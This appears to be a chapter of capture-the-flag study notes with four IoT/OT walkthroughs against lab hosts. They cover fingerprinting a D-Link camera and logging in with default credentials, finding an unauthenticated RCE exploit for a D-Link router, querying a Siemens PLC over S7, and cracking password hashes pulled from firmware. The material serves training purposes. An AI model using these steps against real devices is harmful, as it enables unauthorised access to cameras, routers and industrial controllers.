# 16 IoT / OT — full walkthroughs

---

## Walkthrough 1: "Identify the device at 10.10.10.80 and log in"

**Type:** recon + default creds | **Difficulty:** easy | **Time:** 2–4 min

1. Banner grab:
   ```bash
   curl -I http://10.10.10.80
   ```
   Output:
   ```
   Server: Boa/0.94.14rc21
   WWW-Authenticate: Basic realm="DCS-932L"
   ```
2. Realm `DCS-932L` → D-Link camera. Confirm with nmap:
   ```bash
   nmap -sV -p 80 10.10.10.80
   ```
3. Try default creds — D-Link DCS series is `admin:<blank>`:
   ```bash
   curl -u admin: http://10.10.10.80/
   ```
4. **Answer:** device = `D-Link DCS-932L IP camera`, creds = `admin` / `<blank>`.

---

## Walkthrough 2: "Find a known CVE for the router firmware at 10.10.10.85"

1. Identify:
   ```bash
   curl -I http://10.10.10.85
   whatweb http://10.10.10.85
   ```
   Finds: `D-Link DIR-645` firmware `1.03`.
2. Lookup:
   ```bash
   searchsploit dlink dir-645
   ```
   Output:
   ```
   D-Link DIR-645 < 1.04 - Unauthenticated Remote Command Execution   | exploits/hardware/webapps/31926.txt
   ```
3. **Answer:** `CVE-2013-xxxx` / `EDB-31926` — unauth RCE in `hedwig.cgi`.

---

## Walkthrough 3: "Read PLC data from the Siemens device at 10.10.10.90"

1. Check S7 is up:
   ```bash
   nmap -p 102 10.10.10.90
   ```
2. Pull device info:
   ```bash
   nmap --script s7-info -p 102 10.10.10.90
   ```
3. Output:
   ```
   | s7-info:
   |   Module: 6ES7 315-2EH14-0AB0
   |   Serial number: S C-B4U...
   |   Module name: CPU 315-2 PN/DP
   |_  Plant identification: LINE_A_PUMP
   ```
4. **Answer:** `Siemens S7-315 PN/DP`, plant ID `LINE_A_PUMP`.

**Gotcha:** Modbus version of this is `nmap --script modbus-discover -p 502 <IP>`.

---

## Walkthrough 4: "Extract the admin password from firmware.bin"

1. Identify the file:
   ```bash
   file firmware.bin
   binwalk firmware.bin
   ```
   Shows a SquashFS filesystem inside.
2. Extract:
   ```bash
   binwalk -e firmware.bin
   cd _firmware.bin.extracted/squashfs-root/
   ```
3. Search config + passwd:
   ```bash
   cat etc/passwd
   cat etc/shadow
   grep -r 'admin' etc/
   ```
4. Typical hit in `etc/shadow`:
   ```
   admin:$1$xy$a9v.....:0:0:99999:7:::
   ```
5. Crack with john:
   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt shadow
   ```
6. **Answer:** whatever john reveals (often `admin` or `12345`).

→ Crypto / hash cracking details: [18-cryptography](../18-cryptography/README.md)
